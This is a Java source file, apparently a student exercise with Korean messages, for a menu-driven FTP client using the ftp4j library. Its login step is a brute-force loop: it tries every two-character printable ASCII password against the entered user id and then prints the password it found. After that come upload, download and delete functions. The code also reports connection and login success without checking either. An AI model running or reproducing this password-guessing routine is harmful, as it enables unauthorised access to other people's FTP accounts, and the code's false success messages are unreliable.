import java.io.File;
import java.util.Scanner;

import it.sauronsoftware.ftp4j.FTPClient;
import it.sauronsoftware.ftp4j.FTPFile;

public class FTP {
	public void FTPRun() {
		FTPClient ftp = new FTPClient();
		Scanner sc = new Scanner(System.in);
		Scanner sc1 = new Scanner(System.in);
		while(true) {
			System.out.println("=== FTP Client Program ===");
			System.out.println("1. Connect FTP Server");
			System.out.println("2. Exit Program");
			System.out.print(">>> ");
			int input = Integer.parseInt(sc.nextLine());
			if (input == 1) {
				System.out.println("input url");
				System.out.print(">>> ");
				String url = sc.nextLine();
				System.out.println("input port");
				System.out.print(">>> ");
				int port = Integer.parseInt(sc1.nextLine());
				try {
					ftp.connect(url, port);
				}catch(Exception e) {
					System.out.println("접속에 실패했습니다");
					e.printStackTrace();
				}

				System.out.println("Try to connect : " + url + "(port : " + port + ")");
				System.out.println("FTP Server is connected");

				System.out.print("input id :");
				String id = sc.nextLine();
				/////////////////////////////////////////////////////////////
				String pw1 = null;
				String pw2 = null;
				String pw = null;
				loop : while(true) {
					for (int i = 32; i < 127; i++) { 
						pw1 = Character.toString((char)i);
						String str = String.valueOf(i);
						for (int j = 32; j < 127; j++) {
							pw2 = Character.toString((char)j);
							pw = pw1.concat(pw2);
							System.out.print(pw);
							try {
								ftp.login(id, pw);
								break loop;
							}catch(Exception e) {
								System.out.println(e.getMessage() + pw);
							}
						}
					}
					break;
				}
				////////////////////////////////////////////////////////////

				System.out.println("Login Success");
				System.out.println("Password : " + ftp.getPassword());
				menu : while(true) {
					System.out.println("1. Upload File \n2. Download File \n3. Disconnect FTP Server \n4. Delete File");
					System.out.print(">>> ");
					input = Integer.parseInt(sc.nextLine());
					switch (input) {
					case 1:
						try {
							System.out.print("업로드할 파일의 위치와 이름을 입력 >>> ");
							String upload = sc.nextLine();
							ftp.upload(new File(upload));
						}catch(Exception e) {
							System.out.println("업로드 오류 발생");
							e.printStackTrace();
						}
						break;
					case 2:
						try {
							FTPFile[] list = ftp.list();
							for (int i = 0; i < list.length; i++) {
								System.out.println(list[i].getName() + " " + list[i].getSize() + "bytes");
							}
						} catch(Exception e) {
							System.out.println("리스트 들여오기 실패");
							e.printStackTrace();
						}
						System.out.print("다운로드 받을 이름을 입력 >>>");
						String download = sc.nextLine();
						System.out.print("다운로드 받을 파일 이름을 입력 >>>");
						String dName = sc1.nextLine();
						System.out.println("다운로드 완료");
						try {
							ftp.download(download, new File(dName));
						}catch(Exception e) {
							e.printStackTrace();
						}
						break;
					case 3:
						try {
							ftp.disconnect(true);
							System.out.println("연결 종료");
							break menu;
						}catch(Exception e) {
							e.printStackTrace();
						}
						break;
					case 4:
						try {
							FTPFile[] list = ftp.list();
							for (int i = 0; i < list.length; i++)
								System.out.println(list[i].getName());
						}catch(Exception e) {
							e.printStackTrace();
						}
						try {
							String dFile = sc.nextLine();
							ftp.deleteFile(dFile);
						}catch(Exception e) {
							e.printStackTrace();
						}
						break;
					}
				}
			} else if(input == 2) {
				System.out.println("프로그램을 종료합니다");
				System.exit(0);
			} 
		}
	}
}